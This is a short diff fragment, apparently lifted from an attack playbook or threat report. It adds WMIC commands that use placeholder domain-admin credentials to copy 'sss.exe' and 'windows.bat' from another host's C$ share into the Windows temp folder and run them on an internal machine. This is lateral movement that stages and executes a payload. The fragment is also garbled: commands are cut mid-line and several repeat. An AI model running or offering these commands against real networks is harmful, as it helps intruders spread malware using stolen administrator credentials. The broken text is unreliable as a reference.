@@ -1,0 +1,7 @@
+
+< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c c:\\windows\\temp\\windows.bat\" start wmic /node:\"<internal IP>\" /user:\"
+< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c copy \\\\<internal
+IP>\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\" start wmic /node:\"<internal IP>\" /user:\"
+< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c copy \\\\<internal
+IP>\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\" start wmic /node:\"<internal IP>\" /user:\"
+< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\windows.bat c:\\windows\\temp\\\" start wmic /node:\"<internal IP>\" /user:\"
